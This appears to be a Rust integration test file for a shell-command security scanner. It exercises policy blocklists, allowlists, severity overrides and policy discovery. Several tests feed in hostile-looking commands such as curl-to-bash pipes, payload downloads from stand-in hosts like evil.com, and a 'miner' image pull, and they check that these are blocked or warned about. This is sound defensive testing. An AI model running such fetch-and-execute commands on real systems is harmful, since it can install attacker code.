//! Integration tests for the policy system.
//!
//! These tests create temporary directory structures with `.git` markers and
//! `.tirith/` policy dirs to exercise blocklist, allowlist, severity overrides,
//! and policy discovery through the full engine pipeline.

use std::fs;

use tempfile::TempDir;

use tirith_core::engine::{self, AnalysisContext};
use tirith_core::extract::ScanContext;
use tirith_core::tokenize::ShellType;
use tirith_core::verdict::{Action, RuleId, Severity};

/// Create a temp dir that looks like a repo root with a `.tirith/` policy.
fn make_repo(policy_yaml: &str) -> TempDir {
    let tmp = TempDir::new().expect("create temp dir");
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), policy_yaml).unwrap();
    tmp
}

fn analyze_exec(input: &str, cwd: &str) -> tirith_core::verdict::Verdict {
    let ctx = AnalysisContext {
        input: input.to_string(),
        shell: ShellType::Posix,
        scan_context: ScanContext::Exec,
        raw_bytes: None,
        interactive: true,
        cwd: Some(cwd.to_string()),
        file_path: None,
        repo_root: None,
        is_config_override: false,
        clipboard_html: None,
    };
    engine::analyze(&ctx)
}

// ---------------------------------------------------------------------------
// Blocklist tests
// ---------------------------------------------------------------------------

#[test]
fn test_blocklist_triggers_policy_blocklisted() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "malicious-cdn.example.com\n",
    )
    .unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://malicious-cdn.example.com/payload.sh", cwd);

    assert_eq!(verdict.action, Action::Block);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Should fire PolicyBlocklisted for blocklisted URL. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| &f.rule_id)
            .collect::<Vec<_>>()
    );
    // Verify it's Critical severity
    let blocklist_finding = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::PolicyBlocklisted)
        .unwrap();
    assert_eq!(blocklist_finding.severity, Severity::Critical);
}

#[test]
fn test_blocklist_case_insensitive() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/blocklist"), "MALICIOUS.COM\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://malicious.com/script.sh", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should be case-insensitive"
    );
}

#[test]
fn test_blocklist_substring_match() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/blocklist"), "evil.com\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    // evil.com appears as substring of subdomain.evil.com
    let verdict = analyze_exec("curl https://subdomain.evil.com/path", cwd);

    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should match substrings"
    );
}

// ---------------------------------------------------------------------------
// Allowlist tests
// ---------------------------------------------------------------------------

#[test]
fn test_allowlist_filters_findings() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(repo.path().join(".tirith/allowlist"), "bit.ly\n").unwrap();

    let cwd = repo.path().to_str().unwrap();
    // bit.ly would normally trigger ShortenedUrl warning
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    // Allowlisted URL should have findings removed
    assert_eq!(
        verdict.action,
        Action::Allow,
        "Allowlisted URL should not produce warnings. Findings: {:?}",
        verdict
            .findings
            .iter()
            .map(|f| format!("{}: {}", f.rule_id, f.title))
            .collect::<Vec<_>>()
    );
}

#[test]
fn test_blocklist_overrides_allowlist() {
    let policy = r#"
fail_mode: open
blocklist:
  - evil.com
allowlist:
  - evil.com
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);

    // Blocklist takes precedence over allowlist
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Blocklist should override allowlist"
    );
}

// ---------------------------------------------------------------------------
// Severity override tests
// ---------------------------------------------------------------------------

#[test]
fn test_severity_override_escalates() {
    let policy = r#"
severity_overrides:
  shortened_url: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some(), "Should find ShortenedUrl");
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Critical,
        "severity_overrides should escalate ShortenedUrl to CRITICAL"
    );
    // Critical → Block
    assert_eq!(verdict.action, Action::Block);
}

#[test]
fn test_severity_override_downgrades() {
    let policy = r#"
severity_overrides:
  curl_pipe_shell: LOW
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    let curl_pipe = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::CurlPipeShell);
    assert!(curl_pipe.is_some(), "Should find CurlPipeShell");
    assert_eq!(
        curl_pipe.unwrap().severity,
        Severity::Low,
        "severity_overrides should downgrade CurlPipeShell to LOW"
    );
    // Low → Warn (not Block)
    assert_eq!(
        verdict.action,
        Action::Warn,
        "Downgraded severity should change action from Block to Warn"
    );
}

// ---------------------------------------------------------------------------
// Policy discovery tests
// ---------------------------------------------------------------------------

#[test]
fn test_policy_yml_extension_works() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    // Use .yml instead of .yaml
    fs::write(
        tirith_dir.join("policy.yml"),
        "severity_overrides:\n  shortened_url: CRITICAL\n",
    )
    .unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some(), "Should find ShortenedUrl");
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Critical,
        ".yml extension should work for policy files"
    );
}

#[test]
fn test_policy_yaml_preferred_over_yml() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    // Both exist — .yaml should win
    fs::write(
        tirith_dir.join("policy.yaml"),
        "severity_overrides:\n  shortened_url: CRITICAL\n",
    )
    .unwrap();
    fs::write(
        tirith_dir.join("policy.yml"),
        "severity_overrides:\n  shortened_url: LOW\n",
    )
    .unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);

    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some());
    assert_eq!(
        shortened.unwrap().severity,
        Severity::Critical,
        ".yaml should take precedence over .yml"
    );
}

#[test]
fn test_no_policy_uses_defaults() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    // No .tirith/ dir at all

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    // Default policy: open fail mode, no overrides
    assert_eq!(
        verdict.action,
        Action::Block,
        "Default policy should block pipe-to-shell"
    );
}

#[test]
fn test_malformed_policy_falls_back_to_default() {
    let tmp = TempDir::new().unwrap();
    fs::create_dir_all(tmp.path().join(".git")).unwrap();
    let tirith_dir = tmp.path().join(".tirith");
    fs::create_dir_all(&tirith_dir).unwrap();
    fs::write(tirith_dir.join("policy.yaml"), "{{{{invalid yaml!!!!").unwrap();

    let cwd = tmp.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    // Should fall back to defaults, not crash
    assert_eq!(
        verdict.action,
        Action::Block,
        "Malformed policy should fall back to defaults"
    );
}

// ---------------------------------------------------------------------------
// Policy path reported in verdict
// ---------------------------------------------------------------------------

#[test]
fn test_verdict_reports_policy_path() {
    let repo = make_repo("fail_mode: open\n");

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);

    assert!(
        verdict.policy_path_used.is_some(),
        "Verdict should report the policy path"
    );
    let path = verdict.policy_path_used.as_ref().unwrap();
    assert!(
        path.contains("policy.yaml"),
        "Policy path should contain 'policy.yaml', got: {path}"
    );
}

// ---------------------------------------------------------------------------
// Cookbook scenario: Strict Org (fail_mode: closed, no bypass)
// ---------------------------------------------------------------------------

#[test]
fn test_cookbook_strict_org() {
    let policy = r#"
fail_mode: closed
allow_bypass_env: false
severity_overrides:
  shortened_url: HIGH
  plain_http_to_sink: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();

    // Shortened URL should be HIGH (block)
    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
    let shortened = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::ShortenedUrl);
    assert!(shortened.is_some());
    assert_eq!(shortened.unwrap().severity, Severity::High);
    assert_eq!(verdict.action, Action::Block);
}

// ---------------------------------------------------------------------------
// Cookbook scenario: Docker-focused (escalate docker rules)
// ---------------------------------------------------------------------------

#[test]
fn test_cookbook_docker_focused() {
    let policy = r#"
severity_overrides:
  docker_untrusted_registry: CRITICAL
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();

    let verdict = analyze_exec("docker pull evil-registry.com/miner", cwd);
    let docker_finding = verdict
        .findings
        .iter()
        .find(|f| f.rule_id == RuleId::DockerUntrustedRegistry);
    assert!(docker_finding.is_some());
    assert_eq!(docker_finding.unwrap().severity, Severity::Critical);
    assert_eq!(verdict.action, Action::Block);
}

// ---------------------------------------------------------------------------
// Cookbook scenario: Learning mode (all LOW severity)
// ---------------------------------------------------------------------------

#[test]
fn test_cookbook_learning_mode() {
    let policy = r#"
severity_overrides:
  curl_pipe_shell: LOW
  wget_pipe_shell: LOW
  pipe_to_interpreter: LOW
  punycode_domain: LOW
  confusable_domain: LOW
"#;
    let repo = make_repo(policy);

    let cwd = repo.path().to_str().unwrap();

    // Curl pipe bash would normally BLOCK — in learning mode should WARN
    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
    assert_eq!(
        verdict.action,
        Action::Warn,
        "Learning mode should reduce curl|bash from Block to Warn"
    );
}

// ---------------------------------------------------------------------------
// Org blocklist + allowlist merge
// ---------------------------------------------------------------------------

#[test]
fn test_org_lists_merged_into_policy() {
    let repo = make_repo("fail_mode: open\n");
    let tirith_dir = repo.path().join(".tirith");

    // Org-level blocklist
    fs::write(tirith_dir.join("blocklist"), "blocked-cdn.example.com\n").unwrap();
    // Org-level allowlist
    fs::write(tirith_dir.join("allowlist"), "bit.ly\n").unwrap();

    let cwd = repo.path().to_str().unwrap();

    // Blocklisted URL should be blocked
    let verdict = analyze_exec("curl https://blocked-cdn.example.com/script.sh", cwd);
    assert!(
        verdict
            .findings
            .iter()
            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
        "Org blocklist should be merged into policy"
    );

    // Allowlisted URL should pass
    let verdict = analyze_exec("curl https://bit.ly/safe-link", cwd);
    assert_eq!(
        verdict.action,
        Action::Allow,
        "Org allowlist should filter findings"
    );
}

// ---------------------------------------------------------------------------
// Blocklist comment lines ignored
// ---------------------------------------------------------------------------

#[test]
fn test_blocklist_ignores_comments() {
    let repo = make_repo("fail_mode: open\n");
    fs::write(
        repo.path().join(".tirith/blocklist"),
        "# This is a comment\nevil.com\n# Another comment\n",
    )
    .unwrap();

    let cwd = repo.path().to_str().unwrap();
    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);
    assert_eq!(verdict.action, Action::Block);
}

// ---------------------------------------------------------------------------
// vet integration tests
// ---------------------------------------------------------------------------

#[test]
fn test_use_vet_runner_parsed() {
    let policy = r#"
fail_mode: open
use_vet_runner: true
"#;
    let repo = make_repo(policy);
    let policy = tirith_core::policy::Policy::discover(Some(repo.path().to_str().unwrap()));

    assert!(
        policy.use_vet_runner,
        "Policy should correctly parse use_vet_runner: true"
    );
}
